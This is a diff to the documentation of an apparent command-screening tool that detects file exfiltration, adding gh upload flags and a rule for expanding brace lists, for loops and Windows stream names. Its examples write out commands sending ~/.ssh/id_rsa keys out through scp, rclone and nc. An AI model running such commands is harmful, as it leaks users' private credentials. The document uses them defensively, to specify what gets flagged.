@@ -6004,7 +6004,11 @@ dist .` packs `dist`.
   (when another of its addresses is a network one: `TCP:`, `UDP:`,
   `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
   `s-nail`, `mutt` and `neomutt` (`-a`, `-A`, `--attach`), `gh gist create`
-  (its files, or its input with none or `-`), `az storage blob upload -f`,
+  (its files, or its input with none or `-`), `gh release upload` and
+  `release create` (the assets after the tag, a `#label` off each), the
+  file of `gh`'s `-F`, `--notes-file` and `--body-file` (a release, an
+  issue, a pull request, a comment or a review), `gh api --input FILE` and
+  `-F key=@FILE`, `az storage blob upload -f`,
   and an `sftp` batch: the files its `put`, `reput` and `mput` lines name,
   split into words with sftp's quotes and backslashes (`put ".env"`), read
   from its input (a here-string, an ANSI-C one included, a here-document,
@@ -6164,6 +6168,16 @@ past four, its two oldest are kept as one range of units, from the start of
 the first to the end of the second, which also holds whatever the line runs
 between them, so a call of the name may be judged with more than it runs and
 flagged for it.
+
+Every sender reads its words as the program is handed them, as the read
+rule does: a brace list the shell spells out is each word it makes (`scp
+~/.ssh/id_rsa{,.pub} host:`, `rclone copy ~/.ssh/{id_rsa,x} remote:`; curl
+reads `-T`'s own lists, see above), a `for` over words written out puts
+each word in place of its variable (`for f in ~/.ssh/id_rsa x; do scp "$f"
+host:; done`, and `cat "$f" | nc host 80` in its body), and a Windows name
+the spelling does not settle (a trailing space or dot, a `::$DATA` stream)
+is the file it is a name of. A quoted brace list is read as a list too, as the read
+rule reads it.
 
 Not read, so the caller has to account for them: a PowerShell variable set
 by a name only known when it runs (`Set-Variable $n …`), or set or read
